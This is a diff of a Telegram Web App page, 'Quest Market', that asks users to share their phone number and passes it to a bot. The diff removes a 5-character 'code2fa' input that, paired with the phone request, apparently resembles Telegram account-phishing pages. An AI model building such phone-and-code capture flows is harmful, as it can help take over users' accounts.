@@ -11,29 +11,27 @@
   <div class="page1">
     <img class="main-logo" src="./ico.png" alt="">
     <h1>Quest Market</h1>
-    <p>Натисни, щоб поділитися номером телефону 👇</p>
+    <p>Натисни, щоб поділитися номером телефону</p>
     <button id="sharePhone">Поділитись номером</button>
   </div>
 
-  <div class="page2">
-    <input maxlength="5" id="code2fa" />
-  </div>
-
-  <!-- 👇 Сюди вставляємо JS -->
   <script>
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    // Переконайся, що елемент уже є
-    const btn = document.getElementById("sharePhone");
-    if (btn) {
-      btn.addEventListener("click", () => {
-        console.log("📞 Запит номера телефону...");
-        tg.sendData("request_phone");
-      });
-    } else {
-      console.error("❌ Кнопку #sharePhone не знайдено!");
-    }
+    document.getElementById("sharePhone").addEventListener("click", async () => {
+      try {
+        // :fire: Це офіційний метод, який показує popup Telegram
+        const result = await tg.requestPhoneNumber();
+
+        if (result && result.phone_number) {
+          // Надсилаємо номер одразу в бот
+          tg.sendData(result.phone_number);
+        }
+      } catch (err) {
+        console.error("Помилка при запиті номера:", err);
+      }
+    });
   </script>
 </body>
 </html>
